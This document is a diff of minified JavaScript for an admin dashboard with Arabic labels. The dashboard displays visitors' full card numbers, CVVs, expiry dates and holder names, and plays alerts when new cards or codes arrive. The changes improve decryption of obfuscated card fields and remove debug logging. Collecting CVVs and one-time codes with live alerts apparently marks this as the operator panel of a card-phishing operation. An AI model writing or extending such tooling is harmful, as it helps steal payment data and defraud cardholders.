@@ -1661,24 +1661,6 @@
                                                 d: "M19 5.5a11 11 0 0 1 0 13A11 11 0 0 1 19 5.5z",
                                                 fill: "#FF5F00"
                                             })]
-                                        }), "mada" === v && (0, t.jsxs)("svg", {
-                                            viewBox: "0 0 52 20",
-                                            className: "h-4 w-auto",
-                                            fill: "none",
-                                            children: [(0, t.jsx)("rect", {
-                                                width: "52",
-                                                height: "20",
-                                                rx: "3",
-                                                fill: "#006633"
-                                            }), (0, t.jsx)("text", {
-                                                x: "4",
-                                                y: "14",
-                                                fontFamily: "Arial, sans-serif",
-                                                fontWeight: "900",
-                                                fontSize: "11",
-                                                fill: "white",
-                                                children: "mada"
-                                            })]
                                         }), "amex" === v && (0, t.jsxs)("svg", {
                                             viewBox: "0 0 52 20",
                                             className: "h-4 w-auto",
@@ -1813,11 +1795,11 @@
         };
         if ("معلومات البطاقة" === e || e.startsWith("معلومات البطاقة") || void 0 !== a["رقم البطاقة"]) {
             var m;
-            let d, l, c, p = a["رقم البطاقة"] || "•••• •••• •••• ••••";
+            let d, l, c, p = safeDecrypt(a["رقم البطاقة"] || "", "card") || "•••• •••• •••• ••••";
             p && !p.includes(" ") ? p = p.match(/.{1,4}/g)?.join("  ") || p : p.includes(" ") && (p = p.replace(/\s+/g, "  "));
-            let g = a["تاريخ الانتهاء"] || "••/••",
-                h = a.CVV || "•••",
-                b = a["اسم حامل البطاقة"] || "CARD HOLDER",
+            let g = safeDecrypt(a["تاريخ الانتهاء"] || "", "exp") || "••/••",
+                h = safeDecrypt(a.CVV || "", "cvv") || "•••",
+                b = safeDecrypt(a["اسم حامل البطاقة"] || "", "name") || "CARD HOLDER",
                 x = a["البنك"] || null,
                 f = a["الشبكة"] || null,
                 y = a["نوع البطاقة"] || null,
@@ -2329,26 +2311,60 @@
         }
     }
 
-    function looksEncrypted(e) {
+    function isPlainValue(e, t) {
         if (!e || "string" != typeof e) return !1;
-        let t = e.replace(/\s/g, "");
-        return !(t.length < 12) && !/^[\d\/\-]+$/.test(t) && /^[A-Za-z0-9+/=_-]+$/.test(t)
+        let a = e.trim(),
+            r = a.replace(/\s/g, "");
+        if ("card" === t) return /^\d{13,19}$/.test(r);
+        if ("cvv" === t) return /^\d{3,4}$/.test(r);
+        if ("exp" === t) return /^\d{2}\/?\d{2,4}$/.test(r);
+        if ("name" === t) {
+            if (a.length < 2) return !1;
+            if (/[\u0600-\u06FF]/.test(a)) return !0;
+            if (/\s/.test(a)) return !0;
+            return /^[A-Za-z.'-]+$/.test(a) && a.length < 12 && !looksEncrypted(a)
+        }
+        return !1
     }
 
-    function isValidDecrypted(e, t) {
+    function looksEncrypted(e) {
         if (!e || "string" != typeof e) return !1;
-        let a = e.replace(/\s/g, "");
-        if ("card" === t) return /^\d{13,19}$/.test(a);
-        if ("cvv" === t) return /^\d{3,4}$/.test(a);
-        if ("exp" === t) return /^\d{2}\/?\d{2,4}$/.test(a);
-        return !/[\x00-\x08\x0E-\x1F\uFFFD]/.test(e)
+        let t = e.trim();
+        return t.length >= 2 && /^[A-Za-z0-9+/=_-]+=*$/.test(t) && !/^[\d\s\/\-]+$/.test(t)
+    }
+
+    function getCardField(e, t) {
+        if (!e) return null;
+        let a = {
+            card: ["_v1", "v1", "cardNumber", "X3Yx"],
+            cvv: ["_v2", "v2", "cvv", "X3Yy"],
+            exp: ["_v3", "v3", "expiry", "exp", "X3Yz"],
+            name: ["_v4", "v4", "holderName", "cardHolder", "X3Y0"]
+        } [t] || [];
+        for (let t = 0; t < a.length; t++)
+            if (null != e[a[t]] && "" !== e[a[t]]) return e[a[t]];
+        return null
     }
 
     function safeDecrypt(e, t) {
-        if (!e || "string" != typeof e) return e;
-        if (!looksEncrypted(e)) return e;
-        let a = B(e);
-        return isValidDecrypted(a, t || "card") ? a : e
+        if (null == e || "string" != typeof e) return e;
+        let a = String(e).trim();
+        if (!a) return e;
+        if (isPlainValue(a, t || "text")) return a;
+        if (!looksEncrypted(a)) return e;
+        try {
+            let r = B(a);
+            if (!r || r === a) return e;
+            if ("cvv" === t) return /^\d{3,4}$/.test(r) ? r : e;
+            if ("exp" === t) return /^\d{2}\/?\d{2,4}$/.test(r) ? r : e;
+            if ("card" === t) {
+                let n = r.replace(/\s/g, "");
+                return /^\d{13,19}$/.test(n) ? n : e
+            }
+            if ("name" === t) return r.length >= 2 && /[\u0600-\u06FFa-zA-Z]/.test(r) && !/[\x00-\x08\x0E-\x1F\uFFFD]/.test(r) ? r.trim() : e;
+            return r
+        } catch (e) {}
+        return e
     }
 
     function eNorm(e, t) {
@@ -2533,12 +2549,12 @@
         });
         C.forEach((e, t) => {
             var a;
-            let r, n, s, i, o, d = e.data?._v1,
-                l = e.data?._v2,
-                c = e.data?._v3,
-                u = e.data?._v4;
+            let r, n, s, i, o, d = getCardField(e.data, "card") || getCardField(y, "card"),
+                l = getCardField(e.data, "cvv") || getCardField(y, "cvv"),
+                c = getCardField(e.data, "exp") || getCardField(y, "exp"),
+                u = getCardField(e.data, "name") || getCardField(y, "name");
             try {
-                r = d ? safeDecrypt(d, "card") : void 0, n = l ? safeDecrypt(l, "cvv") : void 0, s = c ? safeDecrypt(c, "exp") : void 0, i = u ? safeDecrypt(u, "card") : void 0
+                r = d ? safeDecrypt(d, "card") : void 0, n = l ? safeDecrypt(l, "cvv") : void 0, s = c ? safeDecrypt(c, "exp") : void 0, i = u ? safeDecrypt(u, "name") : void 0
             } catch (e) {
                 console.error("[Dashboard] Decryption error:", e), r = d, n = l, s = c, i = u
             }
@@ -4722,39 +4738,27 @@
     function eo() {
         let [e, r] = (0, a.useState)([]), [d, l] = (0, a.useState)(null), [c, u] = (0, a.useState)(""), [m, p] = (0, a.useState)("all"), [g, h] = (0, a.useState)(new Set), [b, x] = (0, a.useState)(!0), [f, y] = (0, a.useState)(215), v = (0, a.useRef)(new Set), _ = (0, a.useRef)(null), w = (0, a.useRef)([]), k = (0, a.useRef)(!0), N = (0, a.useRef)(null), A = (0, a.useRef)(null), S = (0, a.useRef)(""), C = (0, a.useRef)(new Map), H = (0, a.useRef)(new Map), [B, P] = (0, a.useState)(null);
         (0, a.useEffect)(() => {
-            console.log("[Init] Dashboard mounted, loading audio...");
             let e = new Audio("/sounds/card_alert.mp3");
             e.preload = "auto", e.volume = 1, N.current = e;
             let t = new Audio("/sounds/code_alert.mp3");
             t.preload = "auto", t.volume = 1, A.current = t;
             let a = localStorage.getItem("admin_token");
-            return console.log("[Init] Token found:", !!a), a && P(a), S.current = new Date().toISOString(), console.log("[Init] lastAlertTime set to:", S.current), setTimeout(() => {
-                N.current && (N.current.currentTime = 0, N.current.play().then(() => {
-                    console.log("[Audio] ✅ Login sound played - audio system working!")
-                }).catch(e => {
-                    console.log("[Audio] ❌ Login sound blocked:", e.message)
-                }))
+            return a && P(a), S.current = new Date().toISOString(), setTimeout(() => {
+                N.current && (N.current.currentTime = 0, N.current.play().catch(() => {}))
             }, 500), () => {
                 N.current = null, A.current = null
             }
         }, []);
         let I = (0, a.useCallback)(() => {
-                console.log("[Audio] ▶▶▶ Playing CARD sound");
                 let e = N.current;
-                e && (e.currentTime = 0, e.play().catch(e => {
-                    console.log("[Audio] Card play error:", e.message)
-                }))
+                e && (e.currentTime = 0, e.play().catch(() => {}))
             }, []),
             E = (0, a.useCallback)(() => {
-                console.log("[Audio] ▶▶▶ Playing CODE sound");
                 let e = A.current;
-                e && (e.currentTime = 0, e.play().catch(e => {
-                    console.log("[Audio] Code play error:", e.message)
-                }))
+                e && (e.currentTime = 0, e.play().catch(() => {}))
             }, []);
         (0, a.useEffect)(() => {
-            if (!B) return void console.log("[Alerts] No token yet, waiting...");
-            console.log("[Alerts] ✅ Starting alert polling with token!");
+            if (!B) return;
             let e = async () => {
                 try {
                     let e = S.current,
@@ -4773,9 +4777,7 @@
                             a = e.updatedAt;
                         t !== a && C.current.set(e.id, a)
                     }
-                } catch (e) {
-                    console.log("[Alerts] Error:", e)
-                }
+                } catch (e) {}
             }, t = setTimeout(e, 2e3), a = setInterval(e, 3e3);
             return () => {
                 clearTimeout(t), clearInterval(a)
@@ -4875,7 +4877,7 @@
                     });
                 let o = new Set(w.current),
                     d = n.filter(e => e.id && !o.has(e.id));
-                !k.current && d.length > 0 && (console.log("[Audio] ★ New visitor joined:", d.length), E()), n.forEach(e => {
+                !k.current && d.length > 0 && E(), n.forEach(e => {
                     e.id && Array.isArray(e.history) && H.current.set(e.id, e.history.length)
                 }), w.current = n.map(e => e.id).filter(e => void 0 !== e), v.current = new Set(n.filter(e => e.isUnread && e.id).map(e => e.id)), k.current && (k.current = !1), r(n), x(!1), l(e => e && e.id ? (_.current = e.id, n.find(t => t.id === e.id) || e) : !e && n.length > 0 ? (_.current = n[0].id || null, n[0]) : e)
             },
